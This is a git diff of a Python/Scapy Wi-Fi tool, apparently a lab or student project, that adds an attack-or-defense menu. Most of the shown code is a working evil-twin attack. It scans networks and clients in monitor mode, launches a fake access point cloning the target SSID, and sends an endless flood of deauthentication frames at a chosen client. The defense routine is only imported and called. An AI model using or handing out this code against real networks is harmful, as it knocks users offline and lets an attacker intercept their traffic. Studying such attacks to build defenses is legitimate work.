@@ -9,6 +9,8 @@ import warnings
 
 from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11Deauth
 
+from defense import defense
+
 warnings.filterwarnings('ignore')
 
 # RUN EXAMPLE: sudo python3 WiFiScanner.py
@@ -64,17 +66,15 @@ def change_channel():
 
 
 def for_ap(frame, interface):
-  while True:
-    sendp(frame, iface = interface, count = 100, inter = 0.1)
+    while True:
+        sendp(frame, iface=interface, count=100, inter=0.1)
 
-def for_client(frame, interface):
-  while True:
-    sendp(frame, iface = interface, count = 100, inter = 0.1)
 
 def enable_monitor_mode(inter):
     os.system(f'sudo ifconfig {inter} down')
     os.system(f'sudo iwconfig {inter} mode monitor')
     os.system(f'sudo ifconfig {inter} up')
+
 
 def disable_monitor_mode(inter):
     os.system(f'sudo ifconfig {inter} down')
@@ -82,39 +82,78 @@ def disable_monitor_mode(inter):
     os.system(f'sudo ifconfig {inter} up')
 
 
-if __name__ == "__main__":
+def evil_twin():
+    # 12. Fake AP
+    fake_ap_cmd = 'sudo gnome-terminal -- sh -c "python3 fakeAP.py ' + \
+                  net['SSID'] + ' ' + str(net['Channel']) + ' ' + interface_internet + ' ' + interface_fake + ';"$SHELL'
+    print(fake_ap_cmd)
+    os.system(fake_ap_cmd)
 
+    # 13. User attack
+    # Source: https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy
+    print('The target is: ', target_mac)
+    print('Attack!!! :)')
+    frame = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
+    deauth1 = threading.Thread(target=for_ap, args=(frame, interface))
+    deauth1.start()
+    deauth1.join()
+
+    # 14. Disable monitor mode and cancel interface division
+    disable_monitor_mode(interface)
+    disable_monitor_mode(interface_fake)
+    if flag_div:
+        os.system(f"iw dev mon0 {interface} del")
+
+
+if __name__ == "__main__":
+    print('1. Evil Twin Attack')
+    print('2. Defense')
+    val = input("Please Choose Action: ")
+    while True:
+        try:
+            choose = int(val)
+            if choose != 1 and choose != 2:
+                raise Exception()
+            break
+        except:
+            val = input("Please Choose Again: ")
+
+    if choose == 1:
+        action = 'Attack'
+    else:
+        action = 'Defense'
+
+    if action == 'Attack':
     # 1. Get network interface card names & print
-    interfaces = os.listdir('/sys/class/net/')
-    print("Interfaces:")
-    for (i, item) in enumerate(interfaces, start=1):
-        print("   " + str(i) + ". " + item)
-    val = input("Please Choose Interface for Dividing (Optinal), otherwise enter -1: ")
+        interfaces = os.listdir('/sys/class/net/')
+        print("Interfaces:")
+        for (i, item) in enumerate(interfaces, start=1):
+            print("   " + str(i) + ". " + item)
+        val = input("Please Choose Interface for Dividing (Optinal), otherwise enter -1: ")
 
     # 2. Choose card interface to split for 2 different interfaces
-    flag_div = True
-    while True:
-        try:
-            choose = int(val)
-            if choose == -1:
-                flag_div = False
+        flag_div = True
+        while True:
+            try:
+                choose = int(val)
+                if choose == -1:
+                    flag_div = False
+                    break
+                interface = interfaces[choose - 1]
+                enable_monitor_mode(interface)
+                os.system(f"sudo iw dev {interface} interface add mon0 type monitor")
+                os.system(f"sudo ifconfig mon0 up")
                 break
-            interface = interfaces[choose - 1]
-            enable_monitor_mode(interface)
-            os.system(f"sudo iw dev {interface} interface add mon0 type monitor")
-            os.system(f"sudo ifconfig mon0 up")
-            break
-        except:
-            val = input("Please Choose Again: ")
-    
-    
+            except:
+                val = input("Please Choose Again: ")
+
     interfaces = os.listdir('/sys/class/net/')
     print("Interfaces:")
     for (i, item) in enumerate(interfaces, start=1):
         print("   " + str(i) + ". " + item)
-    val = input("Please Choose Interface for Attack: ")
+    val = input(f"Please Choose Interface for {action}: ")
 
-    # 2.1 Choose card interface to attack with
+    # 2.1 Choose card interface to attack/defense with
     while True:
         try:
             choose = int(val)
@@ -122,35 +161,38 @@ if __name__ == "__main__":
             break
         except:
             val = input("Please Choose Again: ")
-    val2 = input("Please Choose Interface for Fake AP: ")
+
+    if action == 'Attack':
 
     # 2.2. Choose card interface to create Fake AP with
-    while True:
-        try:
-            if val2 == val:
-                raise Exception()
-            choose = int(val2)
-            interface_fake = interfaces[choose - 1]
-            break
-        except:
-            val = input("Please Choose Again: ")
+        val2 = input("Please Choose Interface for Fake AP: ")
+        while True:
+            try:
+                if val2 == val:
+                    raise Exception()
+                choose = int(val2)
+                interface_fake = interfaces[choose - 1]
+                break
+            except:
+                val2 = input("Please Choose Again: ")
 
-    val3 = input("Please Choose Interface for Internet Access of the Fake AP: ")
+        val3 = input("Please Choose Interface for Internet Access of the Fake AP: ")
 
-    # 2.3. Choose card interface to give internet access for the Fake AP 
-    while True:
-        try:
-            if val3 == val or val3 == val2:
-                raise Exception()
-            choose = int(val3)
-            interface_internet = interfaces[choose - 1]
-            break
-        except:
-            val = input("Please Choose Again: ")
-    
+    # 2.3. Choose card interface to give internet access for the Fake AP
+        while True:
+            try:
+                if val3 == val or val3 == val2:
+                    raise Exception()
+                choose = int(val3)
+                interface_internet = interfaces[choose - 1]
+                break
+            except:
+                val3 = input("Please Choose Again: ")
+
     # 3. Enable monitor mode
     enable_monitor_mode(interface)
-    enable_monitor_mode(interface_fake)
+    if action == 'Attack':
+        enable_monitor_mode(interface_fake)
 
     print('Looking for networks.....')
 
@@ -160,7 +202,7 @@ if __name__ == "__main__":
     channel_changer.start()
 
     # 5. Start sniffing (Synchronous process)
-    sniff(prn=callback, iface=interface, timeout=15)
+    sniff(prn=callback, iface=interface, timeout=30)
 
     # 6. Stop changing channel thread
     stop_threads = True
@@ -170,16 +212,15 @@ if __name__ == "__main__":
         print("\nNo Networks Found! Aborting the process...")
         sys.exit(1)
 
-    # 8. Choose the AP to attack
+    # 8. Choose the AP to attack/defense
     print(networks.iloc[:, [0, 1]])
-    net_val = input("\nPlease enter the index of the AP you want to attack: ")
+    net_val = input(f"\nPlease enter the index of the AP you want to {action}: ")
     while True:
         try:
             net = networks.loc[int(net_val)]
         except:
             net_val = input("Please Choose Again Network: ")
             continue
-    
 
         # 9. Print the Users
         i = 1
@@ -193,9 +234,8 @@ if __name__ == "__main__":
             print('This network was no user:', gateway_mac)
             net_val = input("Please Choose Again Network: ")
 
-  
-    # 10. Choose the Client to attack
-    val = input("\nPlease enter the index of the client you want to attack: ")
+    # 10. Choose the Client to attack/defense
+    val = input(f"\nPlease enter the index of the client you want to {action}: ")
     while True:
         try:
             client = int(val)
@@ -211,31 +251,8 @@ if __name__ == "__main__":
             target_mac = n
             break
         i += 1
-   
-          
-    # 12. Fake AP
-    fake_ap_cmd = 'sudo gnome-terminal -- sh -c "python3 fakeAP.py ' + \
-    net['SSID'] + ' ' + str(net['Channel']) + ' ' + interface_internet+' '+ interface_fake+';"$SHELL'
-    print(fake_ap_cmd)
-    os.system(fake_ap_cmd)
-    
-    # 13. User attack
-    # Source: https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy
-    print('The target is: ', target_mac)
-    print('Attack!!! :)')
-    frame = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
-    frame1 = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
-    deauth1 = threading.Thread(target = for_ap, args = (frame, interface))
-    deauth2 = threading.Thread(target = for_client, args = (frame1, interface))
 
-    deauth1.start()
-    deauth2.start()
-    deauth1.join()
-    deauth2.join()
-
-
-    # 14. Disable monitor mode and cancel interface division
-    disable_monitor_mode(interface)
-    disable_monitor_mode(interface_fake)
-    if flag_div: 
-        os.system(f"iw dev mon0 {interface} del")
+    if action == 'Attack':
+        evil_twin()
+    else:
+        defense(interface, net, target_mac)
